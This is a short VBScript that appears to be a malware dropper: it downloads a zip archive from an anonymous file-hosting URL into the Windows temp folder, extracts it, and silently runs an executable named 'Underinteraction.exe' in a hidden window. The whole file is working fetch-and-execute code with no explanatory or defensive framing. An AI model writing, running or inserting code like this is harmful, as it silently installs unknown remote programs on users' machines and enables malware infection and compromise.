Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
temp = objShell.ExpandEnvironmentStrings("%TEMP%")
zipUrl = "https://files.catbox.moe/zariy7.zip"
zipPath = temp & "\d.zip"
extPath = temp & "\e"
objHTTP.Open "GET", zipUrl, False
objHTTP.Send
If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile zipPath, 2
    objStream.Close
End If
If Not objFSO.FolderExists(extPath) Then objFSO.CreateFolder extPath
Set objZip = CreateObject("Shell.Application")
Set objFolder = objZip.NameSpace(zipPath)
If Not objFolder Is Nothing Then objZip.NameSpace(extPath).CopyHere objFolder.Items, 16
exePath = extPath & "\Underinteraction.exe"
If objFSO.FileExists(exePath) Then objShell.Run exePath, 0, False